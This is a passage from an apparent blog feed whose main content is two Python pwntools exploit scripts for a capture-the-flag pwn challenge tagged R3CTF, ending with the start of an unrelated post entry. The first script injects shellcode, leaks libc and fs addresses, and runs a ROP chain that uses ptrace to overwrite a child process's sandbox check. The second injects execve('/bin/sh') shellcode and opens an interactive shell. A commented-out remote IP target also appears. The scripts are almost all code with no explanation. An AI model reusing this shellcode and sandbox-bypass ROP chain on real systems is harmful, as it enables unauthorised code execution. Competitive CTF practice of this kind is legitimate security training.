class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> run</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">import</span> tty</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">c = <span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c):</span><br><span class=\"line\">        gdb.attach(p, c)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        gdb.attach(p)</span><br><span class=\"line\">        pause()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sb</span>() : <span class=\"keyword\">return</span> libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>], libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> data : p.send(data)</span><br><span class=\"line\">sa  = <span class=\"keyword\">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class=\"line\">sl  = <span class=\"keyword\">lambda</span> data   :p.sendline(data)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class=\"line\">r   = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>   :p.recv(num)</span><br><span class=\"line\">rl  = <span class=\"keyword\">lambda</span> text   :p.recvuntil(text)</span><br><span class=\"line\">pr = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span> :<span class=\"built_in\">print</span>(p.recv(num))</span><br><span class=\"line\">inter   = <span class=\"keyword\">lambda</span>        :p.interactive()</span><br><span class=\"line\">l32 = <span class=\"keyword\">lambda</span>    :u32(p.recvuntil(<span class=\"string\">b&#x27;\\xf7&#x27;</span>)[-<span class=\"number\">4</span>:].ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">l64 = <span class=\"keyword\">lambda</span>    :u64(p.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span>    :u32(p.recv(<span class=\"number\">4</span>).ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span>    :u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">int16   = <span class=\"keyword\">lambda</span> data   :<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>)</span><br><span class=\"line\">lg= <span class=\"keyword\">lambda</span> s, num   :p.success(<span class=\"string\">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;47.238.36.100&#x27;, 9999)</span></span><br><span class=\"line\">elf_patch = <span class=\"string\">&#x27;./pwn&#x27;</span></span><br><span class=\"line\">p = process(elf_patch)</span><br><span class=\"line\">elf = ELF(elf_patch)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class=\"line\">ld = ELF(<span class=\"string\">&#x27;./lib/ld-linux-x86-64.so.2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process([&#x27;seccomp-tools&#x27;, &#x27;dump&#x27;, &#x27;./pwn&#x27;])</span></span><br><span class=\"line\"><span class=\"comment\">#p = process([&#x27;strace&#x27;, &#x27;-o&#x27;, &#x27;output.txt&#x27;, &#x27;./pwn&#x27;])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">game</span>(<span class=\"params\">value</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;Exit&#x27;</span>, <span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;heart(0-3):\\xf0\\x9f\\x99\\x82\\n&#x27;</span>, <span class=\"built_in\">str</span>(value))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sla(b&#x27;token: &#x27;, b&#x27;258:YuH72RYiBbRfazgdyG864ZTFGgZ7NlCoZUu1AfR+ltAOr0k0T0E8R76PjvfYV5FPNWZkPh/ZU5dkYLaiZL7ECg==&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">rand_right_value = -<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):</span><br><span class=\"line\">\tgame(i)</span><br><span class=\"line\">\ttext = p.recv(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">b&#x27;NONONO!!!&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> text:</span><br><span class=\"line\">\t\trand_right_value = i</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\"><span class=\"keyword\">assert</span>(rand_right_value != -<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0xff</span>):</span><br><span class=\"line\">\tgame(rand_right_value)</span><br><span class=\"line\">\trl(<span class=\"string\">b&#x27; $ &#x27;</span>)</span><br><span class=\"line\">\tmoney = <span class=\"built_in\">int</span>(rl(<span class=\"string\">b&#x27;,&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(money)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> money &gt;= <span class=\"number\">134217728</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x19f9)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Exit\\n&#x27;</span>, <span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">pid = u32(rl(<span class=\"string\">b&#x27;Y&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;pid&#x27;</span>, pid)</span><br><span class=\"line\"></span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Exit&#x27;</span>, <span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sc=<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    mov rsi,fs:[rax]</span></span><br><span class=\"line\"><span class=\"string\">    mov rsp,rsi</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    mov dword [rsi + 0x6], eax</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    inc dx</span></span><br><span class=\"line\"><span class=\"string\">    push 20</span></span><br><span class=\"line\"><span class=\"string\">    pop rax</span></span><br><span class=\"line\"><span class=\"string\">    inc di</span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    xor rdi, rdi</span></span><br><span class=\"line\"><span class=\"string\">    push 19</span></span><br><span class=\"line\"><span class=\"string\">    pop rax</span></span><br><span class=\"line\"><span class=\"string\">    syscall</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    ret</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x19be)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;CAN I SAY:&#x27;</span>, asm(sc))</span><br><span class=\"line\"></span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">rl(<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">fs_base = u64(r(<span class=\"number\">8</span>))</span><br><span class=\"line\">r_s = u64(r(<span class=\"number\">8</span>))</span><br><span class=\"line\">r(<span class=\"number\">0xb20</span> - <span class=\"number\">0x10</span>)</span><br><span class=\"line\">libc_base = u64(r(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"keyword\">while</span>(<span class=\"number\">1</span>):</span><br><span class=\"line\">    leak = p.recv(timeout=<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">len</span>(leak)==<span class=\"number\">0</span>):</span><br><span class=\"line\">    \t<span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;fs_base&#x27;</span>, fs_base)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;r_s&#x27;</span>, r_s)</span><br><span class=\"line\"></span><br><span class=\"line\">rax = libc_base + <span class=\"number\">0x0000000000045eb0</span></span><br><span class=\"line\">rdi = libc_base + <span class=\"number\">0x000000000002a3e5</span></span><br><span class=\"line\">rsi = libc_base + <span class=\"number\">0x000000000002be51</span></span><br><span class=\"line\">rdx_r12 = libc_base + <span class=\"number\">0x000000000011f2e7</span></span><br><span class=\"line\">rcx = libc_base + <span class=\"number\">0x000000000003d1ee</span></span><br><span class=\"line\">ret = libc_base + <span class=\"number\">0x0000000000029139</span></span><br><span class=\"line\">syscall = libc_base + <span class=\"number\">0x0000000000118f34</span></span><br><span class=\"line\">getpid = libc_base + libc.sym[<span class=\"string\">&#x27;getpid&#x27;</span>]</span><br><span class=\"line\">ptrace = libc_base + libc.sym[<span class=\"string\">&#x27;ptrace&#x27;</span>]</span><br><span class=\"line\">wait4 = libc_base + libc.sym[<span class=\"string\">&#x27;wait4&#x27;</span>]</span><br><span class=\"line\">system, binsh = get_sb()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ptrace 101</span></span><br><span class=\"line\"><span class=\"comment\"># wait4 61</span></span><br><span class=\"line\">pid = <span class=\"number\">0x1bf2</span></span><br><span class=\"line\">user_regs_struct_buf = libc_base + libc.bss(<span class=\"number\">0x500</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ptarce(0x10, pid, 0, 0)</span></span><br><span class=\"line\">rop = p64(rdi) + p64(<span class=\"number\">0x10</span>) + p64(rsi) + p64(pid) + p64(rdx_r12) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(rcx) + p64(<span class=\"number\">0</span>) + p64(ptrace)</span><br><span class=\"line\"><span class=\"comment\"># ptarce(0x18, pid, 0, 0)</span></span><br><span class=\"line\">rop += p64(rdi) + p64(<span class=\"number\">0x18</span>) + p64(rsi) + p64(pid) + p64(rdx_r12) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(rcx) + p64(<span class=\"number\">0</span>) + p64(ptrace)</span><br><span class=\"line\"><span class=\"comment\"># wait4(pid, 0, 0, 0)</span></span><br><span class=\"line\">rop += p64(rdi) + p64(pid) + p64(rsi) + p64(<span class=\"number\">0</span>) + p64(rdx_r12) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(rcx) + p64(<span class=\"number\">0</span>) + p64(rax) + p64(<span class=\"number\">61</span>) + p64(syscall)</span><br><span class=\"line\"><span class=\"comment\"># ptarce(0x18, pid, 0, buf)</span></span><br><span class=\"line\">rop += p64(rdi) + p64(<span class=\"number\">0xc</span>) + p64(rsi) + p64(pid) + p64(rdx_r12) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(rcx) + p64(user_regs_struct_buf) + p64(ptrace)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak pro_base</span></span><br><span class=\"line\">rop += p64(rax) + p64(<span class=\"number\">20</span>) + p64(rdi) + p64(<span class=\"number\">1</span>) + p64(rsi) + p64(fs_base + <span class=\"number\">0x1f0</span>) + p64(rdx_r12) + p64(<span class=\"number\">1</span>)*<span class=\"number\">2</span> + p64(syscall)</span><br><span class=\"line\"><span class=\"comment\"># readv and rop</span></span><br><span class=\"line\">rop += p64(rax) + p64(<span class=\"number\">19</span>) + p64(rdi) + p64(<span class=\"number\">0</span>) + p64(rsi) + p64(fs_base + <span class=\"number\">0x200</span>) + p64(rdx_r12) + p64(<span class=\"number\">1</span>)*<span class=\"number\">2</span> + p64(syscall)</span><br><span class=\"line\"></span><br><span class=\"line\">rop += p64(user_regs_struct_buf + <span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x8</span>) + p64(fs_base + <span class=\"number\">0x1f0</span>) + p64(<span class=\"number\">0x100</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s(rop)</span><br><span class=\"line\">pid_pro_base = u64(r(<span class=\"number\">8</span>)) - <span class=\"number\">0x3d10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># change sandbox = ret</span></span><br><span class=\"line\">sandbox = pid_pro_base + <span class=\"number\">0x14F6</span></span><br><span class=\"line\">data = <span class=\"number\">0xc3c3c3c3</span></span><br><span class=\"line\"><span class=\"comment\"># ptarce(0x5, pid, sandbox, data)</span></span><br><span class=\"line\">rop = p64(rdi) + p64(<span class=\"number\">0x5</span>) + p64(rsi) + p64(pid) + p64(rdx_r12) + p64(sandbox)*<span class=\"number\">2</span> + p64(rcx) + p64(data) + p64(ptrace)</span><br><span class=\"line\"><span class=\"comment\"># ptarce(0x11, pid, 0, buf)</span></span><br><span class=\"line\">rop += p64(rdi) + p64(<span class=\"number\">0x11</span>) + p64(rsi) + p64(pid) + p64(rdx_r12) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(rcx) + p64(<span class=\"number\">0</span>) + p64(ptrace)</span><br><span class=\"line\"><span class=\"comment\"># exit(0)</span></span><br><span class=\"line\">rop += p64(rax) + p64(<span class=\"number\">0x3c</span>) + p64(syscall)</span><br><span class=\"line\"></span><br><span class=\"line\">s(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;pid_pro_base&#x27;</span>, pid_pro_base)</span><br><span class=\"line\">pause()</span><br></pre></td></tr></table></figure>\n\n<p>sc.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> run</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"><span class=\"keyword\">import</span> tty</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">c = <span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c):</span><br><span class=\"line\">        gdb.attach(p, c)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        gdb.attach(p)</span><br><span class=\"line\">        pause()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sb</span>() : <span class=\"keyword\">return</span> libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>], libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\">s = <span class=\"keyword\">lambda</span> data : p.send(data)</span><br><span class=\"line\">sa  = <span class=\"keyword\">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class=\"line\">sl  = <span class=\"keyword\">lambda</span> data   :p.sendline(data)</span><br><span class=\"line\">sla = <span class=\"keyword\">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class=\"line\">r   = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>   :p.recv(num)</span><br><span class=\"line\">rl  = <span class=\"keyword\">lambda</span> text   :p.recvuntil(text)</span><br><span class=\"line\">pr = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span> :<span class=\"built_in\">print</span>(p.recv(num))</span><br><span class=\"line\">inter   = <span class=\"keyword\">lambda</span>        :p.interactive()</span><br><span class=\"line\">l32 = <span class=\"keyword\">lambda</span>    :u32(p.recvuntil(<span class=\"string\">b&#x27;\\xf7&#x27;</span>)[-<span class=\"number\">4</span>:].ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">l64 = <span class=\"keyword\">lambda</span>    :u64(p.recvuntil(<span class=\"string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span>    :u32(p.recv(<span class=\"number\">4</span>).ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span>    :u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">int16   = <span class=\"keyword\">lambda</span> data   :<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>)</span><br><span class=\"line\">lg= <span class=\"keyword\">lambda</span> s, num   :p.success(<span class=\"string\">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class=\"line\"><span class=\"comment\">#-----------------------------------------------------------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = remote(&#x27;47.238.36.100&#x27;, 9999)</span></span><br><span class=\"line\">elf_patch = <span class=\"string\">&#x27;./pwn&#x27;</span></span><br><span class=\"line\">p = process(elf_patch)</span><br><span class=\"line\">elf = ELF(elf_patch)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class=\"line\">ld = ELF(<span class=\"string\">&#x27;./lib/ld-linux-x86-64.so.2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process([&#x27;seccomp-tools&#x27;, &#x27;dump&#x27;, &#x27;./pwn&#x27;])</span></span><br><span class=\"line\"><span class=\"comment\">#p = process([&#x27;strace&#x27;, &#x27;-o&#x27;, &#x27;output.txt&#x27;, &#x27;./pwn&#x27;])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">game</span>(<span class=\"params\">value</span>):</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;Exit&#x27;</span>, <span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tsla(<span class=\"string\">b&#x27;heart(0-3):\\xf0\\x9f\\x99\\x82\\n&#x27;</span>, <span class=\"built_in\">str</span>(value))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sla(b&#x27;token: &#x27;, b&#x27;258:YuH72RYiBbRfazgdyG864ZTFGgZ7NlCoZUu1AfR+ltAOr0k0T0E8R76PjvfYV5FPNWZkPh/ZU5dkYLaiZL7ECg==&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">rand_right_value = -<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):</span><br><span class=\"line\">\tgame(i)</span><br><span class=\"line\">\ttext = p.recv(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">b&#x27;NONONO!!!&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> text:</span><br><span class=\"line\">\t\trand_right_value = i</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\"><span class=\"keyword\">assert</span>(rand_right_value != -<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0xff</span>):</span><br><span class=\"line\">\tgame(rand_right_value)</span><br><span class=\"line\">\trl(<span class=\"string\">b&#x27; $ &#x27;</span>)</span><br><span class=\"line\">\tmoney = <span class=\"built_in\">int</span>(rl(<span class=\"string\">b&#x27;,&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(money)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> money &gt;= <span class=\"number\">134217728</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b *$rebase(0x19be)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Exit\\n&#x27;</span>, <span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">pid = u32(rl(<span class=\"string\">b&#x27;Y&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;pid&#x27;</span>, pid)</span><br><span class=\"line\"></span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;Exit&#x27;</span>, <span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># execve(&#x27;/bin/sh&#x27;, 0, 0)</span></span><br><span class=\"line\">sc=<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">\tmov rsi,fs:[rax]</span></span><br><span class=\"line\"><span class=\"string\">    mov rsp,rsi</span></span><br><span class=\"line\"><span class=\"string\">    mov rax, 0x68732f6e69622f</span></span><br><span class=\"line\"><span class=\"string\">    push rax;</span></span><br><span class=\"line\"><span class=\"string\">    push rsp;</span></span><br><span class=\"line\"><span class=\"string\">    pop rdi;</span></span><br><span class=\"line\"><span class=\"string\">    xor esi, esi;</span></span><br><span class=\"line\"><span class=\"string\">    xor edx, edx;</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    push 0x3b;</span></span><br><span class=\"line\"><span class=\"string\">    pop rax;</span></span><br><span class=\"line\"><span class=\"string\">    syscall;</span></span><br><span class=\"line\"><span class=\"string\">   \t</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">pause()</span><br><span class=\"line\">sa(<span class=\"string\">b&#x27;CAN I SAY:&#x27;</span>, asm(sc))</span><br><span class=\"line\">inter()</span><br></pre></td></tr></table></figure>\n\n\n\n",
            "tags": [
                "R3CTF"
            ]
        },
        {
            "id": "http://example.com/2024/07/22/frps/",
            "url": "http://example.com/2024/07/22/frps/",
            "title": "frpc 通过代理连接 frps",
            "date_published": "2024-07-22T14:08:23.000Z",
